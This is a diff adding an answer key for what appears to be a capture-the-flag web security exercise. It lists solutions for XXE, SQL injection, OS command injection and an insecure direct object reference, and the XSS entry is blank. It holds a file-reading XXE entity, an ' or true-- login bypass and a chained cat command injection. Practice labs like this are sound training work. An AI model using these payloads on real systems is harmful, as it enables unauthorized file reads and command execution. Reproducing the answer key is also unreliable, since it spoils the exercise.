@@ -1,0 +1,27 @@
+Please find below the solutions
+
+1. XXE
+Send the login request with the following payload 
+ <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:./flag.flg"> ]>
+    <userInfo>
+     <username>&ent;</username>
+     <password>&ent;</password>
+    </userInfo>
+
+The user can find that the file is in ./flag.flg because in the original map when clicking on number 9, it asks did you find flag.flg ?
+The Flag is then displayed in the answer
+
+2. SQL Injection
+Put in the payload ' or true-- instead of username and in the response of the request there is the flag
+
+3. OS Commande injection
+In the purchase history, when inputting in the search the payload : 4 && cd .. && ls && cd flag && ls && cat flag.flg
+
+4. XSS
+Create a number with the payload 
+
+5. Direct object reference 
+For this one, just download the invoice number 7 
+https://frontend-map-numbers.azurewebsites.net/invoice/Invoice_number7
+there is no authentication here
+The user can find it because on the original numbers, number 7 says who put me there ?
